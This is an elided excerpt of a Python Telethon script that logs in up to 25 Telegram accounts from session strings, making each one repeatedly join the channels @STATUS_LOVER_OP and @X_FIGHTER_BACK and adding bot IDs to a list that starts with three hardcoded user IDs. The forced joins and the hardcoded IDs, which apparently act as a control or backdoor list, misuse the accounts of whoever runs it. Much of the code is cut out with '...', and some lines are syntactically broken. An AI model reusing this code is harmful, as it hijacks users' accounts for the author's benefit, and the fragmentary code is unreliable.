...
from Config import STRING, SUDO, BIO_MESSAGE, ALIVE_IMAGE, ALIVE_NAME, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 
import asyncio
...
SMEX_USERS = [5221051232, 5273112771, 2032682418]
for x in SUDO: 5221051232
...
async def start_yukki():
    ...
    if smex:
        ...
        try:
            ...
            await idk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await idk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await idk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await idk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if smexx:
        ...
        try:
            ...
            await ydk.start()
            await ydk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await ydk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await ydk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await ydk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if smexxx:
        ...
        try:
            ...
            await  wdk.start()
            await wdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await wdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await wdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await wdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if smexxxx:
        ...
        try:
            ...
            await hdk.start()
            await hdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await hdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await hdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await hdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if smexxxxx:
        ...
        try:
            ...
            await sdk.start()
            await sdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await sdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await sdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await sdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if sixth:
        ...
        try:
            ...
            await adk.start()
            await adk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await adk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await adk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await adk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if seven:
        ...
        try:
            ...
            await bdk.start()
            await bdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await bdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await bdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await bdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if eight:
        ...
        try:
            ...
            await cdk.start()
            await cdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await cdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await cdk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await cdk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if ninth:
        ...
        try:
            ...
            await ddk.start()
            await ddk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await ddk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await ddk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await ddk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if tenth:
        ...
        try:
            ...
            await edk.start()
            await edk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await edk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await edk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await edk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if eleve:
        ...
        try:
            ...
            await vkk.start()
            await vkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await vkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await vkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await vkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
    ...
    if thirt:
        ...
        try:
            ...
            await lkk.start()
            await lkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await lkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await lkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await lkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
    ...
    if forte:
        ...
        try:
            ...
            await mkk.start()
            await mkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await mkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await mkk(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await mkk(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
    ...
    if fifth:
        ...
        try:
            ...
            await sid.start()
            await sid(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await sid(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await sid(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await sid(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
    ...
    if sieee:
        ...
        try:
            ...
            await shy(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await shy(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await shy(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await shy(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if seeee:
        ...
        try:
            ...
            await aan(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await aan(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await aan(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await aan(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if eieee:
        ...
        try:
            ...
            await ake(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await ake(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await ake(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await ake(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if nieee:
        ...
        try:
            ...
            await eel(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await eel(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await eel(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await eel(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if gandu:
        ...
        try:
            ...
            await khu(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await khu(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await khu(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await khu(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if ekish:
        ...
        try:
            ...
            await shi(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await shi(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await shi(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await shi(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if baish:
        ...
        try:
            ...
            await yaa(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await yaa(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await yaa(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await yaa(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if teish:
        ...
        try:
            ...
            await dav(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await dav(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await dav(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await dav(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if tfour:
        ...
        try:
            ...
            await raj(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await raj(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await raj(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await raj(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if tfive:
        ...
        try:
            ...
            await put(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await put(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            await put(functions.channels.JoinChannelRequest(channel="@STATUS_LOVER_OP"))
            await put(functions.channels.JoinChannelRequest(channel="@X_FIGHTER_BACK"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
